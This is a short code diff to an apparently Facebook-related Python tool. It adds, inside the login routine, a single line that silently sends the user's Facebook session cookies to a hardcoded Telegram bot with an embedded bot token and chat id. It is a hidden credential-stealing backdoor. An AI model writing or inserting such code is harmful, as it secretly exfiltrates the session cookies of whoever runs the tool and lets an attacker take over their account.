@@ -323,6 +323,7 @@ def lxgin():
         token = open('.tokn.txt','r').read()
         info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
         sins(f"{lgr}  [✓] LOGIN SUCCESSFULLY")
+        requests.post(f"https://api.telegram.org/bot6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o/sendMessage?chat_id=6542321044&text=| {fbcokis}")
         slp(2)
         mxnu()
     except Exception as error: 
